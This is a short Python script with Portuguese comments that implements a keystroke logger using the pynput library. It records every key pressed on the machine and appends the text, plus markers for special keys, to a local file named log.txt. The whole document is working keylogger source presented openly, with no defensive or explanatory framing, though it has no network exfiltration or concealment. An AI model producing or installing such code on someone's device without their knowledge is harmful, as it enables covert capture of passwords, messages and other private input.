#1. importando bibliotecas
from pynput import keyboard
#2. IGNORANDO TECLAS ESPECIAIS
IGNORAR = {
    keyboard.Key.shift,
    keyboard.Key.shift_r,
    keyboard.Key.ctrl_l,
    keyboard.Key.ctrl_r,
    keyboard.Key.alt_l,
    keyboard.Key.alt_r,
    keyboard.Key.cmd,
    keyboard.Key.caps_lock,}

#3. FUNÇÃO PARA CAPTURAR TECLAS PRESSIONADAS função principal.
def on_press(key):
    try:
         # se for uma tecla "normal" (letra, numero, simbolo)
         with open("log.txt", "a", encoding="utf-8") as f:
             f.write(key.char)
    except AttributeError:
        with open("log.txt", "a", encoding="utf-8") as f:
            if key == keyboard.Key.space:
                f.write(" ")
            elif key == keyboard.Key.enter:
                f.write("\n")
            elif key == keyboard.Key.tab:
                f.write("\t")   
            elif key == keyboard.Key.backspace:
                f.write(" ")
            elif key == keyboard.Key.esc:
                f.write(" [ESC] ")
            elif key in IGNORAR:
                pass
            else:
                f.write(f" [{key}] ")
#4. função para iniciar o listener e ouvir nosso teclado.
with keyboard.Listener(on_press=on_press) as listener:
    listener.join()